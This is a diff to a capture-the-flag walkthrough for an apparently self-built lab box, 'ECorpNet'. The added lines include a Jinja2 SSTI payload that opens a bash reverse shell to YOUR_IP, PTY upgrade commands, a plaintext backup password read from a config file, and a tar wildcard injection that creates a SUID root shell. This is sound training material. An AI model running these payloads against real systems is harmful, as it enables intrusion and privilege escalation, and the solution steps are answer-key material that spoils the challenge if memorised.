@@ -1,7 +1,8 @@
 # ECorpNet: Breach & Climb — walkthrough
 
-> **SPOILER.** Full intended path from recon to root. Keep it in the private repo;
-> `box/provision.sh` never copies it onto the box.
+> **SPOILER.** Full intended path from recon to root. `box/provision.sh` never copies
+> it onto the box. Automated solvers: [`solve/`](solve/). Russian step-by-step
+> writeup with expected outputs: [`docs/writeup-ru.md`](docs/writeup-ru.md).
 
 Box built by `sudo ./box/provision.sh` (Debian 13). Flags are random per box:
 `/root/.ctf-flags` on the server.
@@ -16,7 +17,7 @@ Box built by `sudo ./box/provision.sh` (Debian 13). Flags are random per box:
 | 5 | `pnair` → root | `sudo` script runs `tar … *` in a pnair-writable dir (wildcard injection) | `root.txt` |
 
 ```bash
-export T=10.42.0.62          # box
+export T=192.168.50.116      # box
 export B=http://$T
 ```
 
@@ -102,7 +103,7 @@ john --show --format=raw-md5 hashes.txt
 Sign in as **pprice / bowwow** → Administrator (Phillip Price, CEO).
 Note: online brute force is not an option — 10 failures per IP+user / 10 min lockout.
 
-## 3. Admin → shell as `ecorpnet`  ⬜ verify yourself
+## 3. Admin → shell as `ecorpnet`  ✅ verified
 
 **Where:** Admin → Email templates (`/admin/comms/<id>`) → **Preview** button.
 
@@ -112,9 +113,13 @@ subject → Jinja2 SSTI → Python → OS commands.
 
 **Steps:**
 1. Confirm SSTI with a harmless arithmetic expression in the body — the preview shows the evaluated result.
-2. Escalate to command execution and a reverse shell — the working payload is in
-   `README.md` → "Intended exploitation path", step 6 (mind the note on backgrounding the shell).
-3. Upgrade to a PTY (needed for `su` in the next stage).
+2. Escalate to command execution and a reverse shell (`nc -lvnp 4444` on your side), payload in the **Body** field, then **Send test preview**:
+   ```
+   {{ lipsum.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" </dev/null >/dev/null 2>&1 &').read() }}
+   ```
+   The redirects and the trailing `&` matter: without them the HTTP request hangs while the shell lives.
+3. Upgrade to a PTY (needed for `su` in the next stage):
+   `python3 -c 'import pty; pty.spawn("/bin/bash")'`, Ctrl+Z, `stty raw -echo; fg`, `export TERM=xterm`.
 
 **Expect:** `id` → `uid=…(ecorpnet) gid=…(ecorpnet)`, cwd `/opt/ecorpnet/app`.
 The app code is read-only for you (root-owned + systemd `ReadOnlyPaths`), so you can't wreck it for other players.
@@ -123,13 +128,14 @@ The app code is read-only for you (root-owned + systemd `ReadOnlyPaths`), so you
 - `su`/`sudo` must work from this shell (the unit no longer has `NoNewPrivileges=yes`).
 - `ls /home` must list `pnair` (`ProtectHome=read-only`, not `yes`).
 
-## 4. `ecorpnet` → `pnair` (user flag)  ⬜ verify yourself
+## 4. `ecorpnet` → `pnair` (user flag)  ✅ verified
 
 **Enumeration** (manual or linPEAS — "interesting files / passwords in config"):
 ```bash
 id; ls -la /home
-grep -ril 'pass' /etc 2>/dev/null    # among the results: /etc/ecorpnet/backup.conf
+find / -xdev -group ecorpnet -not -path '/opt/*' 2>/dev/null   # -> /etc/ecorpnet/backup.conf
 ls -la /etc/ecorpnet/                # root:ecorpnet 640 — readable by our group
+cat /etc/ecorpnet/backup.conf        # BACKUP_USER=pnair  BACKUP_PASS=SteelMountain-Backup#2015
 ```
 
 `backup.conf` belongs to Priya Nair (IT Operations) and contains `BACKUP_USER` /
@@ -142,7 +148,7 @@ ssh pnair@$T
 cat ~/user.txt      # flag{...}
 ```
 
-## 5. `pnair` → root (root flag)  ⬜ verify yourself
+## 5. `pnair` → root (root flag)  ✅ verified
 
 ```bash
 sudo -l
@@ -160,7 +166,18 @@ looks like a tar option is parsed as an option. pnair can create files in
 `--checkpoint-action` options), delivered through file names in `/srv/reports`
 (classic "tar wildcard injection").
 
-**Expect:** a root shell or a root-owned SUID copy of bash → `cat /root/root.txt` → `flag{...}`.
+```bash
+cd /srv/reports
+printf '#!/bin/sh\ncp /bin/bash /var/tmp/rb\nchmod 4755 /var/tmp/rb\n' > x.sh
+touch ./--checkpoint=1
+touch './--checkpoint-action=exec=sh x.sh'
+sudo /usr/local/bin/steelmountain-backup
+/var/tmp/rb -p
+id                    # euid=0(root)
+cat /root/root.txt    # flag{...}
+```
+
+Use `/var/tmp`, not `/tmp`: on Debian 13 `/tmp` is a `nosuid` tmpfs, so a SUID bash there gives you nothing.
 
 Notes for players who come from the web shell: root obtained inside
 `ecorpnet.service` is still in its sandbox (`/usr`, `/etc`, `/root` read-only,
@@ -174,6 +191,9 @@ Notes for players who come from the web shell: root obtained inside
 - Full rollback (after anyone got root): `sudo ctf-snapshot` once when the box is final (and after every intentional change, e.g. a password change), then `sudo ctf-restore` — deletes everything created since the snapshot in `/etc /root /home /srv /usr/local /opt/ecorpnet`, restores files/modes, removes new SUID binaries, then runs `ctf-reset`.
 - Rotate flags: `sudo rm /root/.ctf-flags && sudo ./box/provision.sh`.
 - Before players connect: no other account (e.g. the admin's own) may have a weak password — anyone in the `sudo` group with a guessable password = free root over SSH. Remove `~/ctf-src` from the box.
+
+- The app trusts one proxy hop (`ProxyFix(x_for=1)`) so per-IP rate limits (5 sign-ups/hour, 30 failed logins/10 min) apply per player, not to everyone behind nginx at once. During the first live run this was missing and the whole room shared one bucket; hot fix on a running box: raise `MAX_*` in `/opt/ecorpnet/app/ecorpnet/auth.py`, then `sudo systemctl kill -s HUP ecorpnet` (keeps player shells).
+- One admin account for everyone: tell players not to change `pprice`'s password. To restore it: `sudo sqlite3 /opt/ecorpnet/app/instance/ecorpnet.db "UPDATE users SET password_hash='0691df26da82d6eb2e5da8924628db63', is_active=1 WHERE username='pprice'; DELETE FROM login_attempts;"`
 
 ### Unintended-path checklist (verified on 2026-11-11)
 - Only `pprice` is in rockyou; other web users' hashes do not crack.
